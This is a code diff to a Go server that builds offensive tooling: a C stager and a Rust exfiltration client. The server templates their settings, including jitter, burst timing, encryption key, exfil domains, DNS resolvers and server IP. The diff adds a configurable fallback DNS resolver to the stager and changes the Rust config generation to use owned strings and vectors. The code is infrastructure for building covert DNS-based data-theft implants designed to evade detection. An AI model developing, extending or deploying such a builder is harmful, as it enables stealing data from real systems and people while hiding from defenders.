@@ -294,6 +294,7 @@ type StagerBuildRequest struct {
 	JitterMaxMs    int    `json:"jitter_max_ms"`
 	ChunksPerBurst int    `json:"chunks_per_burst"`
 	BurstPauseMs   int    `json:"burst_pause_ms"`
+	FallbackDNS    string `json:"fallback_dns"`
 }
 
 type ExfilClientBuildRequest struct {
@@ -763,6 +764,14 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 	}
 	if req.BurstPauseMs < 0 {
 		req.BurstPauseMs = 120000 // 120 seconds default
+	}
+
+	// Use global fallback DNS if not specified in request
+	if req.FallbackDNS == "" {
+		req.FallbackDNS = api.config.FallbackDNS
+	}
+	if req.FallbackDNS == "" {
+		req.FallbackDNS = "8.8.8.8" // Ultimate fallback
 	}
 
 	// Note: client_binary_id is optional and just for UI tracking
@@ -1313,6 +1322,7 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 	codeStr = strings.Replace(codeStr, `#define MAX_CHUNK_DELAY_MS 120000`, fmt.Sprintf(`#define MAX_CHUNK_DELAY_MS %d`, req.JitterMaxMs), 1)
 	codeStr = strings.Replace(codeStr, `#define CHUNKS_PER_BURST 5`, fmt.Sprintf(`#define CHUNKS_PER_BURST %d`, req.ChunksPerBurst), 1)
 	codeStr = strings.Replace(codeStr, `#define BURST_PAUSE_MS 120000`, fmt.Sprintf(`#define BURST_PAUSE_MS %d`, req.BurstPauseMs), 1)
+	codeStr = strings.Replace(codeStr, `#define FALLBACK_DNS "8.8.8.8"`, fmt.Sprintf(`#define FALLBACK_DNS "%s"`, req.FallbackDNS), 1)
 
 	if err := os.WriteFile(stagerPath, []byte(codeStr), 0644); err != nil {
 		return "", fmt.Errorf("failed to write stager.c: %w", err)
@@ -1442,10 +1452,10 @@ func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKe
 	}
 
 	replacement := fmt.Sprintf(`static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
-	encryption_key: "%s",
+	encryption_key: "%s".to_string(),
 	domains: %s,
 	resolvers: %s,
-	server_ip: "%s",
+	server_ip: "%s".to_string(),
 	chunk_bytes: %d,
 	jitter_min_ms: %d,
 	jitter_max_ms: %d,
@@ -1488,15 +1498,15 @@ func embedExfilConfig(buildDir string, req ExfilClientBuildRequest, encryptionKe
 func formatRustStringSlice(values []string) string {
 	clean := filterEmpty(values)
 	if len(clean) == 0 {
-		return "&[]"
+		return "vec![]"
 	}
 
 	literals := make([]string, 0, len(clean))
 	for _, value := range clean {
-		literals = append(literals, fmt.Sprintf("\"%s\"", formatRustStringLiteral(value)))
+		literals = append(literals, fmt.Sprintf("\"%s\".to_string()", formatRustStringLiteral(value)))
 	}
 
-	return fmt.Sprintf("&[%s]", strings.Join(literals, ", "))
+	return fmt.Sprintf("vec![%s]", strings.Join(literals, ", "))
 }
 
 func formatRustStringLiteral(value string) string {
